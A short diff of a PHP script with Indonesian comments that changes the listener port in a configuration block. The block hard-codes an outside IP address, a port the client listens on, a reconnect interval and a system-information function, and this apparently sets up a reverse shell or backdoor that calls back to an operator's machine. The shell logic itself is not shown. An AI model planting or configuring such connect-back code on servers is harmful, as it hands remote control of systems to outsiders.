@@ -1,7 +1,7 @@
 <?php
 // Konfigurasi
  $target_ip = "103.125.43.187"; // Ganti dengan IP client Anda
- $target_port = 2012;           // Port yang Anda dengarkan di client
+ $target_port = 2000;           // Port yang Anda dengarkan di client
  $reconnect_interval = 5;       // Interval reconnect (detik)
 
 // Fungsi untuk mendapatkan informasi sistem
